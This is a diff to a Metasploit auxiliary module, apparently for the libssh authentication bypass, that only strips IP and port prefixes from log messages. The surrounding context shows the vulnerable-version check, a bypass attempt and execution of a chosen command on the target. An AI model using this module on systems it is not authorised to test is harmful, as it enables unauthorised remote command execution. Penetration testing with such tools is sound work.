@@ -72,17 +72,17 @@ class MetasploitModule < Msf::Auxiliary
     version =~ /libssh[_-]?([\d.]*)$/ && $1 && (v = Rex::Version.new($1))
 
     if v.nil?
-      vprint_error("#{ip}:#{rport} - #{version} does not appear to be libssh")
+      vprint_error("#{version} does not appear to be libssh")
       Exploit::CheckCode::Unknown("#{version} does not appear to be libssh")
     elsif v.to_s.empty?
-      vprint_warning("#{ip}:#{rport} - libssh version not reported")
+      vprint_warning("libssh version not reported")
       Exploit::CheckCode::Detected('libssh detected but version not reported')
     elsif v.between?(Rex::Version.new('0.6.0'), Rex::Version.new('0.7.5')) ||
           v.between?(Rex::Version.new('0.8.0'), Rex::Version.new('0.8.3'))
-      vprint_good("#{ip}:#{rport} - #{version} appears to be unpatched")
+      vprint_good("#{version} appears to be unpatched")
       Exploit::CheckCode::Appears("#{version} appears to be unpatched")
     else
-      vprint_error("#{ip}:#{rport} - #{version} appears to be patched")
+      vprint_error("#{version} appears to be patched")
       Exploit::CheckCode::Safe("#{version} appears to be patched")
     end
   end
@@ -101,14 +101,14 @@ class MetasploitModule < Msf::Auxiliary
 
     ssh_opts.merge!(verbose: :debug) if datastore['SSH_DEBUG']
 
-    print_status("#{ip}:#{rport} - Attempting authentication bypass")
+    print_status("Attempting authentication bypass")
 
     begin
       ssh = Timeout.timeout(datastore['SSH_TIMEOUT']) do
         Net::SSH.start(ip, username, ssh_opts)
       end
     rescue Net::SSH::Exception => e
-      vprint_error("#{ip}:#{rport} - #{e.class}: #{e.message}")
+      vprint_error("#{e.class}: #{e.message}")
       return
     end
 
@@ -135,7 +135,7 @@ class MetasploitModule < Msf::Auxiliary
     sleep 0.1
 
     if (e = shell.error)
-      print_error("#{ip}:#{rport} - #{e.class}: #{e.message}")
+      print_error("#{e.class}: #{e.message}")
       return
     end
 
@@ -149,11 +149,11 @@ class MetasploitModule < Msf::Auxiliary
       output = shell.channel && (shell.channel[:data] || '').chomp
 
       if output.blank?
-        print_error("#{ip}:#{rport} - Empty or blank command output")
+        print_error("Empty or blank command output")
         return
       end
 
-      print_status("#{ip}:#{rport} - Executed: #{datastore['CMD']}\n#{output}")
+      print_status("Executed: #{datastore['CMD']}\n#{output}")
     end
   end
 
